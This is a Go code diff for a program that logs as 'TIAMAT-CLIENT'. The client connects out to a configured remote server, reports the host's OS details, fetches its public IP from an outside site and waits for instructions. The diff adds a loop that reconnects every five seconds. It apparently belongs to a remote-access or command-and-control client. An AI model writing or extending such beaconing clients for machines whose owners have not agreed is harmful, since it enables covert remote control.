@@ -12,6 +12,7 @@ import (
 	"os/user"
 	"runtime"
 	"strings"
+	"time"
 )
 
 type Client struct {
@@ -41,17 +42,29 @@ var (
 )
 
 func main() {
+	log.SetPrefix("[TIAMAT-CLIENT] ")
+	for {
+		if err := start(); err != nil {
+			log.Print(err)
+		}
+		time.Sleep(time.Second * 5)
+	}
+}
+
+func start() error {
 	conn, err := net.Dial("tcp", RemoteIP+":"+RemotePort)
 	if err != nil {
-		log.Fatalf("Error happened connecting to server: %v\n", err)
+		e := fmt.Errorf("Error happened connecting to server: %v\n", err)
+		return e
 	}
 	defer conn.Close()
 	if err := sendOSInfo(conn); err != nil {
-		log.Fatal(err)
+		return err
 	}
 	for {
 		if err := awaitInstructions(conn); err != nil {
-			log.Fatalf("Error happened awaiting instructions: %v\n", err)
+			e := fmt.Errorf("Error happened awaiting instructions: %v\n", err)
+			return e
 		}
 	}
 }
@@ -59,10 +72,12 @@ func main() {
 func getIP() (string, error) {
 	res, err := http.Get("https://ip.bulgariu.xyz")
 	if err != nil {
+		log.Printf("Error happened GETting IP: %v\n", err)
 		return "", nil
 	}
 	resbody, err := io.ReadAll(res.Body)
 	if err != nil {
+		log.Printf("Error happened reading IP body: %v\n", err)
 		return "", nil
 	}
 	ip := strings.TrimRight(string(resbody), "\n")
